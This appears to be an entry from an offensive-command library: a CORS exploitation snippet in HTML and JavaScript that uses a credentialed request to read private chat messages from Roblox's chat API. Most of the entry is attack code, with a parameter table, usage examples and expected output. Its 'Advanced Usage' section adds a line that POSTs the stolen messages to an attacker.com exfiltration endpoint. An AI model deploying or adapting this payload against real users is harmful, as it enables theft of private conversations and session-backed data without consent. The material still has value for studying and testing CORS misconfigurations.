---
id: f6g7h8i9-j0k1-2345-fghi-678901234567
data: >-
  <h2>CORS To Read Chat</h2><div id="demo"><button type="button"
  onclick="cors()">Chat Reader @ Roblox</button></div><script>function
  cors(){var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange=function(){if(this.readyState == 4 && this.status ==
  200){ document.getElementById("demo").innerHTML =
  document.write(this.responseText);}};
  xhttp.open("GET","https://chat.roblox.com/v2/get-messages?conversationId=469104576&pageSize=3",true);
  xhttp.withCredentials = true; xhttp.send();}</script>
tags:
  - cors-exploitation
type: command
output: Chat messages from the specified conversation displayed in the page
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T04:39:01.987Z'
verified: false
validated: true
submitted: true
---
# javascript-cors-chat-reader

## Command

```html
<h2>CORS To Read Chat</h2><div id="demo"><button type="button" onclick="cors()">Chat Reader @ Roblox</button></div><script>function cors(){var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange=function(){if(this.readyState == 4 && this.status == 200){ document.getElementById("demo").innerHTML = document.write(this.responseText);}}; xhttp.open("GET","https://chat.roblox.com/v2/get-messages?conversationId=469104576&pageSize=3",true); xhttp.withCredentials = true; xhttp.send();}</script>
```

## Description

This HTML/JavaScript snippet creates a button that, when clicked, performs a credentialed CORS GET request to Roblox's chat API, fetching and displaying private messages if the hosting origin is whitelisted.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| conversationId | Specific chat ID (e.g., 469104576) | Yes |
| pageSize | Number of messages to retrieve (e.g., 3) | Yes |
| withCredentials | Boolean to include auth cookies (true) | Yes |

## Examples

### Basic Usage

Embed in an HTML page and load in browser:

```html
<h2>CORS To Read Chat</h2><div id="demo"><button type="button" onclick="cors()">Chat Reader @ Roblox</button></div><script>function cors(){var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange=function(){if(this.readyState == 4 && this.status == 200){ document.getElementById("demo").innerHTML = document.write(this.responseText);}}; xhttp.open("GET","https://chat.roblox.com/v2/get-messages?conversationId=469104576&pageSize=3",true); xhttp.withCredentials = true; xhttp.send();}</script>
```

### Advanced Usage

Add error handling and exfil:

```javascript
function cors(){var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange=function(){if(this.readyState == 4 && this.status == 200){ var data = this.responseText; fetch('https://attacker.com/exfil', {method: 'POST', body: data}); document.getElementById("demo").innerHTML = data;}}; ...}
```

## Expected Output

On success (200 OK), the page writes JSON chat data like {"messages": [{"text": "Private message", ...}]}, displaying conversation content directly.

## Related

- [[Related Procedure: Exploit CORS to Read Chat Messages]]
